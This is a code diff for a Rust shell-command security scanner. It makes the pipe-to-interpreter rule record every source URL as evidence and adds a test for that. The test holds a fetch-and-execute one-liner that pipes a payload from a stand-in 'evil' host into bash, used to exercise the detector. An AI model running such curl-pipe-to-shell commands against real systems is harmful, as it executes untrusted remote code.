@@ -787,7 +787,9 @@ fn check_pipe_to_interpreter(
                         let show_tirith_run = cfg!(unix)
                             && supports_tirith_run_hint(&source_base)
                             && shell != ShellType::PowerShell;
-                        if let Some(url) = extract_url_from_args(&source.args, shell)
+                        if let Some(url) = extract_urls_from_args(&source.args, shell)
+                            .into_iter()
+                            .next()
                             .map(|u| sanitize_url_for_display(&u))
                         {
                             if show_tirith_run {
@@ -817,18 +819,23 @@ fn check_pipe_to_interpreter(
                         base_desc
                     };
 
+                    let mut evidence = vec![Evidence::CommandPattern {
+                        pattern: "pipe to interpreter".to_string(),
+                        matched: redact::redact_shell_assignments(&format!(
+                            "{} | {}",
+                            source.raw, seg.raw
+                        )),
+                    }];
+                    for url in extract_urls_from_args(&source.args, shell) {
+                        evidence.push(Evidence::Url { raw: url });
+                    }
+
                     findings.push(Finding {
                         rule_id,
                         severity: Severity::High,
                         title: format!("Pipe to interpreter: {source_cmd_ref} | {display_cmd}"),
                         description,
-                        evidence: vec![Evidence::CommandPattern {
-                            pattern: "pipe to interpreter".to_string(),
-                            matched: redact::redact_shell_assignments(&format!(
-                                "{} | {}",
-                                source.raw, seg.raw
-                            )),
-                        }],
+                        evidence,
                         human_view: None,
                         agent_view: None,
                         mitre_id: None,
@@ -1340,23 +1347,25 @@ fn sanitize_url_for_display(url: &str) -> String {
     url.chars().filter(|&c| !c.is_ascii_control()).collect()
 }
 
-/// Extract the first URL from command arguments.
-fn extract_url_from_args(args: &[String], shell: ShellType) -> Option<String> {
+/// Extract all URLs from command arguments.
+fn extract_urls_from_args(args: &[String], shell: ShellType) -> Vec<String> {
+    let mut urls = Vec::new();
     for arg in args {
         let normalized = normalize_shell_token(arg.trim(), shell);
 
         if starts_with_http_scheme(&normalized) {
-            return Some(normalized);
+            urls.push(normalized);
+            continue;
         }
 
         // Check --flag=<url> forms (e.g., --url=https://...)
         if let Some((_, val)) = normalized.split_once('=') {
             if starts_with_http_scheme(val) {
-                return Some(val.to_string());
+                urls.push(val.to_string());
             }
         }
     }
-    None
+    urls
 }
 
 /// Check command destination hosts against policy network deny/allow lists (Team feature).
@@ -2412,6 +2421,33 @@ mod tests {
                 .contains("https://example.com/install.sh"),
             "should extract URL from --flag=value"
         );
+    }
+
+    #[test]
+    fn test_pipe_to_interpreter_evidence_includes_all_source_urls() {
+        let input =
+            "curl https://trusted.example.com/install.sh https://evil.example.com/payload.sh | bash";
+        let segments = tokenize::tokenize(input, ShellType::Posix);
+        let mut findings = Vec::new();
+        check_pipe_to_interpreter(&segments, ShellType::Posix, &mut findings);
+        assert_eq!(findings.len(), 1);
+
+        let urls: Vec<&str> = findings[0]
+            .evidence
+            .iter()
+            .filter_map(|e| match e {
+                Evidence::Url { raw } => Some(raw.as_str()),
+                _ => None,
+            })
+            .collect();
+
+        assert_eq!(
+            urls.len(),
+            2,
+            "all source URLs must be preserved in evidence"
+        );
+        assert!(urls.contains(&"https://trusted.example.com/install.sh"));
+        assert!(urls.contains(&"https://evil.example.com/payload.sh"));
     }
 
     #[test]
